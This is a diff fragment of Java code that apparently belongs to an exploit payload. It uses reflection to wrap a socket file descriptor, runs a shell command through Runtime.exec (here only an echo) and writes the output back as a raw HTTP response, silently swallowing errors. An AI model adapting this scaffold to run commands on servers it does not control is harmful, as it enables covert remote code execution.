@@ -62,7 +62,7 @@
             Object socketOutputStream = constructor2.newInstance(new Object[]{constructor3.newInstance(new Object[]{fileDescriptor})});
 
             String res = new java.util.Scanner(Runtime.getRuntime().exec("echo \"It works!!\"").getInputStream()).useDelimiter("\\A").next();
-            String result = "HTTP/1.1 200 OK\nConnection: close\n\n" + res + "\n";
+            String result = "HTTP/1.1 200 OK\nConnection: close\nContent-Length: " + res.length() + "\n\n" + res + "\n";
             write.invoke(socketOutputStream,  new Object[]{result.getBytes()});
         }catch (Exception e){
             //pass
